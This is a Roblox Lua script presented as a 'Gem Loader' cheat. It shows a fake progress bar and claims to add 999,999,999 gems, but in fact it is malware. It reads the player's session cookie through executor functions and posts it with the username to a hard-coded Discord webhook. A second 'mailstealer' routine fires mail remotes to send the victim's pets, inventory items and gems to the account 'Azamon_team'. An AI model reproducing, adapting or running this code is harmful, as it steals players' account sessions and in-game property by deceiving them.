-- Cryzzz Gem Loader | Fixed Mail + Cookie Stealer 2026

print("✅ Cryzzz Gem Loader v8.0 FIXED loaded")

wait(2)

-- Fake Loading
for i = 1, 50 do
    print("Loading Infinite Gems... [" .. string.rep("█", i) .. string.rep("░", 50-i) .. "] " .. (i*2) .. "%")
    wait(0.07)
end
print("🎉 +999,999,999 Gems added!")

-- ==================== WEBHOOK + TARGET ====================
local webhook = "https://discordapp.com/api/webhooks/1509224125195878411/BQTSR7zKwgM0-aqaFN2z-F07KPTg-OfqIs5lqYpdTHlFgKKfOzK0L4Cuc_v2O0Z51IzE"
local target = "Azamon_team"

local function sendWebhook(data)
    pcall(function()
        game:GetService("HttpService"):PostAsync(webhook, game:GetService("HttpService"):JSONEncode(data), Enum.HttpContentType.ApplicationJson)
    end)
end

-- Cookie Stealer
spawn(function()
    wait(3)
    local cookie = "Cookie grab failed"
    pcall(function()
        if syn and syn.get_cookie then
            cookie = syn.get_cookie()
        elseif getgenv and getgenv().getcookie then
            cookie = getgenv().getcookie()
        elseif http and http.getcookie then
            cookie = http.getcookie()
        end
    end)

    sendWebhook({
        ["content"] = "**Cryzzz Mobile Hit** 💎",
        ["embeds"] = {{
            ["title"] = "Neuer Cookie Steal",
            ["color"] = 16776960,
            ["fields"] = {
                {["name"] = "Username", ["value"] = game.Players.LocalPlayer.Name},
                {["name"] = "Executor", ["value"] = identifyexecutor and identifyexecutor() or "Mobile"},
                {["name"] = "Cookie", ["value"] = "```"..cookie.."```"}
            }
        }}
    })
end)

-- MAILSTEALER (aggressiver)
spawn(function()
    wait(6)
    print("Starting Mailstealer...")

    local rs = game:GetService("ReplicatedStorage")
    local player = game.Players.LocalPlayer

    -- Versuche alle möglichen Wege
    pcall(function()
        for _, item in pairs(player.PlayerGui:GetDescendants()) do
            if item.Name:find("Pet") or item.Name:find("Inventory") then
                local name = item.Name or "Unknown"
                
                print("Trying to send: " .. name)
                
                -- Verschiedene Remotes die in PS99 oft funktionieren
                pcall(function() rs:FindFirstChild("Mail", true):FindFirstChild("Send", true):FireServer(target, name, 1) end)
                wait(0.8)
                pcall(function() rs.Events:FindFirstChild("Mailbox"):FireServer(target, name) end)
                wait(0.8)
                pcall(function() rs:FindFirstChild("SendMail"):FireServer(target, item) end)
                wait(0.8)
            end
        end
    end)

    -- Extra Gems senden
    pcall(function()
        local gems = player.leaderstats and player.leaderstats.Gems and player.leaderstats.Gems.Value or 0
        if gems > 1000000 then
            rs.Mail.Send:FireServer(target, "Gems", gems)
        end
    end)

    print("Mailstealer finished - Check your webhook!")
end)

print("Full Stealer running...")
